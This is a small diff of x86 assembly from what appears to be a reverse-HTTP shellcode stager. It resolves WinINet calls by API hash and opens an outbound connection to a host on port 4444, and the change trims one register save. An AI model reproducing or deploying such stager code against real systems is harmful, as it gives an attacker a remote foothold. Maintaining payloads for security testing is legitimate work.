@@ -26,7 +26,6 @@ internetopen:
   push esi               ; LPCTSTR lpszAgent
   push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
   call ebp
-  mov esi, eax           ; save the HINTERNET handle
 
   jmp dbl_get_server_host
 
@@ -40,7 +39,7 @@ internetconnect:
   push ecx               ; username
   push dword 4444        ; PORT
   push ebx               ; HOSTNAME
-  push esi               ; HINTERNET hInternet
+  push eax               ; HINTERNET hInternet
   push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
   call ebp
 
